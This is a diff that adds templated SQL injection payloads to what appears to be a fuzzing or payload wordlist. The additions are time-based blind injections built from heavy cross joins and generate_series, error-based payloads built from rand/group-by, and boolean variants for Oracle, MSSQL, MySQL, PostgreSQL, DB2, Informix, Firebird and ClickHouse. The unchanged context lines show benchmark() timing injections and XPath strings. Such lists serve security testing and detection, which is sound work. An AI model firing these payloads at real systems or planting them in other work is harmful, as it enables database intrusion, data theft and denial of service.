@@ -58,6 +58,15 @@
 ',(select%20if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))%23
 ',(select%20if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))--
 ',(select%20if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))/*
+(select (case when ([randnum]=[randnum]) then (select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) else [randnum] end) from dual)
+(select (case when ([randnum]=[randnum]) then (select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) else [randnum] end))
+(select [randnum] from(select count(*),concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]',floor(rand(0)*2))x from information_schema.plugins group by x)a)
+(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)
+(select count(*) from generate_series(1,[sleeptime]000000))
+(select count(*) from information_schema.columns a, information_schema.columns b, information_schema.columns c where 0 xor 1)
+(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)
+(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)
+(select count(*) from sysmaster:syspaghdr)
 ),(select if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))#
 ),(select if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))--
 ),(select if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))/*
@@ -68,6 +77,11 @@
 *{background:url(xx:x //**/\red/*)} /* ie 6-7 standards mode */
 +++++/////*****
 +-*//*-+
+,(select (case when ([randnum]=[randnum]) then (select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) else 1/(select 0 from dual) end) from dual)
+,(select (case when ([randnum]=[randnum]) then (select count(*) from generate_series(1,[sleeptime]000000)) else 1/(select 0) end))
+,(select (case when ([randnum]=[randnum]) then (select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) else [randnum]*(select [randnum] union all select [randnum1]) end))
+,(select [randnum] from (select row([randnum],[randnum1])>(select count(*),concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]',floor(rand(0)*2))x from (select [randnum2] union select [randnum3] union select [randnum4] union select [randnum5])a group by x))s)
+,(select [randnum] from(select count(*),concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]',floor(rand(0)*2))x from information_schema.plugins group by x)a)
 ,(select if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))#
 ,(select if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))--
 ,(select if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))/*
@@ -119,7 +133,19 @@ account(imcompleto).xml
 agdez//**--
 alger16//**
 and (select 4523 from(select count(*),concat(0x716a7a6a71,(select (elt(4523=4523,1))),0x71706a6b71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)
+and (select [randnum] from(select count(*),concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]',floor(rand(0)*2))x from information_schema.plugins group by x)a)
 and (select count(tbl_name) from sqlite_master where type='table' and tbl_name not like 'sqlite_%' ) < number_of_table
+and [randnum]=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)
+and [randnum]=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)
+and [randnum]=(select count(*) from generate_series(1,[sleeptime]000000))
+and [randnum]=(select count(*) from information_schema.columns a, information_schema.columns b, information_schema.columns c where 0 xor 1)
+and [randnum]=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)
+and [randnum]=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)
+and [randnum]=(select count(*) from sysmaster:syspaghdr)
+and [randnum]=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)
+and [randnum]=(select count(fuzzbits('[randstr]', 0.001)) from numbers(1000000))
+and [randnum]=cast('[delimiter_start]'||(select (case when ([randnum]=[randnum]) then bitcount(bitstring_to_binary('1')) else bitcount(bitstring_to_binary('0')) end))::varchar||'[delimiter_stop]' as numeric)
+and row([randnum],[randnum1])>(select count(*),concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]',floor(rand(0)*2))x from (select [randnum2] union select [randnum3] union select [randnum4] union select [randnum5])a group by x)
 content/add_valid_page.qu%65ry.js%6fn?statement=//*
 content/add_valid_page.qu9665ry.js%6fn?statement=//*
 content/add_valid_page.query.json?statement=//*
@@ -161,6 +187,18 @@ jiif///***
 length_true=`echo $response | cut -d ":" -f 2`      #1 or count(parent::*[position()=1])=0
 mozilla/4.0 (compatible; msie 7.0; windows nt 6.2; win64; x64; trident/7.0; .net4.0c; .net4.0e; .net clr 2.0.50727; .net clr 3.0.30729; .net clr 3.5.30729; *://*.lowes.com)
 mozilla/5.0 (windows nt 6.2; win64; x64; trident/7.0; *://*.lowes.com; rv:11.0) like gecko
+or (select [randnum] from(select count(*),concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]',floor(rand(0)*2))x from information_schema.plugins group by x)a)
+or [randnum]=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)
+or [randnum]=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)
+or [randnum]=(select count(*) from generate_series(1,[sleeptime]000000))
+or [randnum]=(select count(*) from information_schema.columns a, information_schema.columns b, information_schema.columns c where 0 xor 1)
+or [randnum]=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)
+or [randnum]=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)
+or [randnum]=(select count(*) from sysmaster:syspaghdr)
+or [randnum]=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)
+or [randnum]=(select count(fuzzbits('[randstr]', 0.001)) from numbers(1000000))
+or [randnum]=cast('[delimiter_start]'||(select (case when ([randnum]=[randnum]) then bitcount(bitstring_to_binary('1')) else bitcount(bitstring_to_binary('0')) end))::varchar||'[delimiter_stop]' as numeric)
+or row([randnum],[randnum1])>(select count(*),concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]',floor(rand(0)*2))x from (select [randnum2] union select [randnum3] union select [randnum4] union select [randnum5])a group by x)
 qqq123456ppp//*
 qsu=-719//*-928
 quan.266//**
